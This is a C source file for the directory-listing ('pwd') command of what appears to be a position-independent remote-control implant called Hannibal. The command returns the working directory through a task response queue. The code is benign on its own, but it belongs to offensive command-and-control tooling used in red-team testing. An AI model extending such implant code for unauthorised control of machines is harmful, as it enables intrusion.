#include "config.h"


#ifdef INCLUDE_CMD_PWD


#include "hannibal_tasking.h"


SECTION_CODE void cmd_pwd(TASK t)
{
    HANNIBAL_INSTANCE_PTR

    CMD_PWD *pwd = (CMD_PWD *)t.cmd;


    WCHAR *response_content = (WCHAR *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, MAX_PATH*sizeof(WCHAR));

    DWORD len = hannibal_instance_ptr->Win32.GetCurrentDirectoryW(MAX_PATH, response_content);

    TASK response_t;
    response_t.output = (LPCSTR)response_content;
    response_t.output_size = pic_strlenW(response_content)*sizeof(WCHAR) + 2;
    response_t.task_uuid = t.task_uuid;

    task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);

    hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
    
}

#endif